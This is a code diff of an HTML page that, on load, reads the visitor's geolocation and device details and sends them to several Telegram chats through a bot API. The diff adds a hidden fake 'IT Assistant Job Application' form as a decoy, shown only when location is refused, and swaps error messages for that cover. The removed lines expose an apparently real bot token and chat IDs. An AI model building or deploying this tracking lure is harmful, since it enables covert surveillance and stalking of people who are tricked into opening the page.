@@ -5,10 +5,107 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Device & Location Info</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+    <style>
+        /* 🔁 Added styles for form */
+        .form-container {
+            background-color: white;
+            padding: 30px 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            margin-top: 20px;
+        }
+
+        .form-container img {
+            display: block;
+            margin: 0 auto 20px;
+            width: 120px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #444;
+        }
+
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 15px;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #0077b6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #005f87;
+        }
+    </style>
 </head>
 <body>
     <h2>Device & Location Info</h2>
-    <p id="location">Waiting for location permission...</p>
+    <div id="location">Waiting for location permission...</div>
+
+    <!-- 🔁 Hidden Form -->
+    <div id="applicationForm" style="display: none;">
+        <div class="form-container">
+            <img src="your-logo.png" alt="Company Logo">
+            <h2>IT Assistant Job Application</h2>
+            <form action="#" method="POST">
+                <div class="form-group">
+                    <label for="name">Name with Full Initials</label>
+                    <input type="text" id="name" name="name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="address">Address</label>
+                    <input type="text" id="address" name="address" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="text" id="phone" name="phone" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="qualifications">Enter Your Qualifications</label>
+                    <textarea id="qualifications" name="qualifications" required></textarea>
+                </div>
+
+                <button type="submit" class="submit-btn">Submit Application</button>
+            </form>
+        </div>
+    </div>
 
     <script>
         function getLocation() {
@@ -19,7 +116,7 @@
                     maximumAge: 0
                 });
             } else {
-                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
+                showFormInstead();
             }
         }
 
@@ -27,38 +124,22 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;
-
-            // ✅ Update the browser URL with location parameters
             updateBrowserURL(lat, lon);
-
-            // ✅ Collect device details
             const deviceInfo = getDeviceDetails();
-
-            // ✅ Send data to Telegram
             sendLocation(lat, lon, deviceInfo);
         }
 
         function showError(error) {
-            let message = "";
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = "Location access was denied. Please enable location in browser settings.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    message = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    message = "An unknown error occurred.";
-                    break;
-            }
-            document.getElementById("location").innerHTML = message;
+            // 🔁 Instead of error message, show the form
+            showFormInstead();
+        }
+
+        function showFormInstead() {
+            document.getElementById("location").style.display = "none";
+            document.getElementById("applicationForm").style.display = "block";
         }
 
         function updateBrowserURL(lat, lon) {
-            // ✅ Modify the URL in the browser without reloading
             const newUrl = `${window.location.origin}${window.location.pathname}?lat=${lat}&lon=${lon}`;
             window.history.replaceState(null, "", newUrl);
         }
@@ -67,8 +148,7 @@
             const userAgent = navigator.userAgent;
             const parser = new UAParser();
             const result = parser.getResult();
-            const deviceModel = result.device.model || "Unknown Device"; // Get model from UAParser
-
+            const deviceModel = result.device.model || "Unknown Device";
             const browser = result.browser.name;
             const os = result.os.name;
             const screenWidth = window.screen.width;
@@ -79,11 +159,9 @@
         }
 
         function sendLocation(lat, lon, deviceInfo) {
-            const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with your bot token
-            const chatIds = ["6238170291", "1641066188", "5808291565"]; // List of chat IDs
-
+            const botToken = "YOUR_BOT_TOKEN";
+            const chatIds = ["CHAT_ID_1", "CHAT_ID_2", "CHAT_ID_3"];
             const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})\n\n${deviceInfo}`;
-
             chatIds.forEach(chatId => {
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: "POST",
@@ -100,9 +178,7 @@
             });
         }
 
-        // ✅ Run getLocation automatically when page loads
         window.onload = getLocation;
     </script>
 </body>
 </html>
-
